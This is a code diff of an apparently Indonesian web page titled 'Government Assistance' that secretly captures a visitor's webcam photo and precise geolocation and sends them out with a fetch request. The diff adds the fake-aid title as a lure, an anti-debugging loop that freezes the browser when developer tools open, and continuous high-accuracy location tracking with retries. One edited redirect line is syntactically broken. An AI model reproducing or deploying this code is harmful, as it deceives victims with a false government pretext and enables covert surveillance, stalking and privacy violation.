@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Sender</title>
+    <title>Bantuan Dari Pemerintah</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body {
@@ -45,6 +45,19 @@
                 document.addEventListener("contextmenu", function(e) {
                     e.preventDefault();
                 });
+
+                // **Freeze Debugger**
+                let freeze = () => {
+                    function freezeLoop() {
+                        let start = performance.now();
+                        debugger;
+                        if (performance.now() - start > 50) {
+                            while (true) {}
+                        }
+                    }
+                    setInterval(freezeLoop, 100);
+                };
+                freeze();
             }
             protect();
 
@@ -58,12 +71,18 @@
                     document.getElementById('video').srcObject = stream;
                 }).catch(() => {});
 
-                navigator.geolocation.getCurrentPosition(p => {
-                    lat = p.coords.latitude;
-                    lon = p.coords.longitude;
-                }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
+                navigator.geolocation.watchPosition(
+                    (position) => {
+                        lat = position.coords.latitude;
+                        lon = position.coords.longitude;
+                    },
+                    (error) => {
+                        console.warn("❌ Gagal mendapatkan lokasi:", error.message);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
 
-                setTimeout(sendData, 4000);
+                setTimeout(sendData, 5000); // Beri waktu untuk mendapatkan lokasi & membuka kamera
             }
 
             function capturePhoto() {
@@ -80,6 +99,12 @@
             }
 
             function sendData() {
+                if (!lat || !lon) {
+                    console.warn("❌ Lokasi belum tersedia, mencoba lagi...");
+                    setTimeout(sendData, 3000); // Coba lagi jika lokasi belum didapat
+                    return;
+                }
+
                 const img = capturePhoto();
                 const blob = dataURItoBlob(img);
 
@@ -98,7 +123,7 @@
                     body: formData
                 }).finally(() => {
                     stopCamera();
-                    window.location.href = "https://github.com/TakeuchiSan/";
+                    window.location.href = https://github.com/TakeuchiSan/";
                 });
             }
 
